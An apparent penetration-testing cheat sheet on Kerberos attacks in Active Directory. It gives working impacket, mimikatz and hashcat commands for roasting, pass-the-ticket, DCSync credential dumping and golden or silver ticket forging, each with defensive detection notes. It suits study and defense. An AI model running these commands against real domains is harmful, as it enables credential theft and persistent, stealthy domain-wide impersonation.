# Kerberos Tickets — Roasting, Pass-the-*, Golden & Silver

The Kerberos attack chain, from cracking a service account to forging tickets that grant domain-wide access. Each section ends with how defenders detect or prevent it.

> **Authorized labs only.** Golden and silver tickets are domain-persistence techniques with serious impact. They are documented here for learning, blue-team detection, and authorized testing. Nothing below is novel — all are public, well-known techniques.

## How Kerberos works (the 30-second version)
- A client proves its identity to the **KDC** (the Domain Controller) and receives a **TGT** (Ticket Granting Ticket), signed with the **krbtgt** account's key.
- To use a service, the client presents the TGT and gets a **TGS** (service ticket), encrypted with the **target service account's** key.
- The service trusts the TGS because it can decrypt it — it does **not** call back to the DC. This trust is what golden/silver tickets abuse.

---

## 1. AS-REP Roasting
Accounts with "Do not require Kerberos pre-authentication" hand out a crackable blob to anyone.
```bash
impacket-GetNPUsers domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt -no-pass
```
- `-usersfile` — list of users to test. `-format hashcat` — output a hashcat-ready hash. `-no-pass` — no credentials needed.
- Crack: `hashcat -m 18200 asrep.txt rockyou.txt`.
- **Defense:** remove "don't require pre-auth"; alert on 4768 with RC4.

## 2. Kerberoasting
Any authenticated user can request TGS tickets for accounts that have an **SPN**; the ticket is encrypted with that account's password hash.
```bash
impacket-GetUserSPNs domain.local/user:pass -request -outputfile kerb.txt
```
- `-request` — actually fetch the TGS tickets (not just list SPNs). `-outputfile` — save the crackable hashes.
- Crack: `hashcat -m 13100 kerb.txt rockyou.txt`.
- **Defense:** long/managed service-account passwords (gMSA), AES-only, alert on bulk 4769 requests.

## 3. Overpass-the-Hash (Pass-the-Key)
Turn an NTLM hash into a real Kerberos TGT.
```bash
impacket-getTGT domain.local/user -hashes :<NTHASH>
export KRB5CCNAME=user.ccache
impacket-psexec -k -no-pass domain.local/user@host.domain.local
```
- `getTGT -hashes :<NTHASH>` — request a TGT using the hash. `KRB5CCNAME` — point tools at the cached ticket. `-k -no-pass` — use Kerberos, no password.

## 4. Pass-the-Ticket
Reuse a stolen/forged ticket (`.ccache` on Linux, `.kirbi` on Windows).
```bash
export KRB5CCNAME=/path/ticket.ccache
impacket-wmiexec -k -no-pass domain.local/user@host.domain.local
```
- `-k` — use the Kerberos ticket from `KRB5CCNAME`. On Windows, `mimikatz kerberos::ptt ticket.kirbi` injects it into the session.

---

## Prerequisites for forging tickets
Both golden and silver tickets need some values. Collect them first:

| Value | What it is | How to get it |
| --- | --- | --- |
| **Domain SID** | the domain's security identifier | `impacket-lookupsid domain.local/user:pass@dc` or `whoami /user` on a host |
| **krbtgt hash** (golden) | NT (and/or AES) key of the `krbtgt` account | DCSync: `impacket-secretsdump -just-dc-user krbtgt domain.local/DA:pass@dc` |
| **Service account hash** (silver) | NT/AES key of the target service account (often a computer account `HOST$`) | `secretsdump` / `mimikatz sekurlsa::ekeys` on a host running the service |

> Getting the **krbtgt** hash already requires Domain-Admin-level access (DCSync). A golden ticket is therefore a **persistence / stealth** technique, not a privilege-escalation shortcut.

---

## 5. Golden Ticket
A **forged TGT** encrypted with the krbtgt key. Because every DC trusts krbtgt, you can impersonate **any user (including a Domain Admin) for any service**, and it survives the real user's password change.

### With Impacket (from Linux)
```bash
impacket-ticketer -nthash <krbtgt_NT> -domain-sid <DOMAIN_SID> -domain domain.local Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass domain.local/Administrator@dc01.domain.local
```
- `ticketer` — builds the ticket. `-nthash <krbtgt_NT>` — the krbtgt key. `-domain-sid` — the domain SID. The final arg (`Administrator`) is the username to impersonate (it need not exist).

### With Mimikatz (on Windows)
```text
kerberos::golden /user:Administrator /domain:domain.local /sid:<DOMAIN_SID> /krbtgt:<krbtgt_NT> /id:500 /ptt
```
- `/user` — name to impersonate. `/sid` — domain SID. `/krbtgt` — krbtgt NT hash. `/id:500` — RID (500 = built-in Administrator). `/ptt` — inject the ticket into the current session immediately.
- **Defense:** **rotate the krbtgt password twice** (invalidates existing golden tickets), enforce short TGT lifetimes, monitor for TGTs with anomalous lifetimes or users that don't exist, and deploy Microsoft Defender for Identity. A golden ticket often shows as a TGS request (4769) with **no preceding** TGT request (4768).

---

## 6. Silver Ticket
A **forged TGS** for one specific service, encrypted with that **service account's** key. Narrower than a golden ticket (one service, one host) but **stealthier** — it never touches the DC, so there is no 4768/4769 on the DC at all.

### With Impacket
```bash
impacket-ticketer -nthash <service_NT> -domain-sid <DOMAIN_SID> -domain domain.local \
  -spn cifs/server01.domain.local Administrator
export KRB5CCNAME=Administrator.ccache
impacket-smbexec -k -no-pass domain.local/Administrator@server01.domain.local
```
- `-spn cifs/server01...` — the service to forge for (`cifs` = file shares, `host` = tasks/WMI, `http`, `mssqlsvc`, …). `-nthash <service_NT>` — the **service account's** hash (for host services this is the computer account `SERVER01$`).

### With Mimikatz
```text
kerberos::golden /user:Administrator /domain:domain.local /sid:<DOMAIN_SID> /target:server01.domain.local /service:cifs /rc4:<service_NT> /ptt
```
- Same module as golden, but `/target` + `/service` + the **service** key (`/rc4`) scope it to one service on one host.
- **Defense:** rotate computer-account passwords, require Kerberos **PAC validation**, enable AES, and treat local-admin-equivalent service accounts as tier-0. Silver tickets are hard to see on the DC — hunt on the **target host** for logons without matching DC tickets.

---

## Tooling summary
| Tool | Role |
| --- | --- |
| **impacket** (GetUserSPNs, GetNPUsers, secretsdump, ticketer, getTGT) | cross-platform, run from the attack host (Linux) |
| **mimikatz** (sekurlsa, lsadump, kerberos::golden/ptt) | on-host Windows, plaintext + ticket forging |
| **pypykatz** | Python/Linux port of mimikatz parsing |
| **Rubeus** | C# on-host alternative for roasting, PtT, and ticket forging |

See also: [06-Active-Directory overview](README.md) · [08-Password-Attacks](../08-Password-Attacks/) for cracking the roasted hashes.
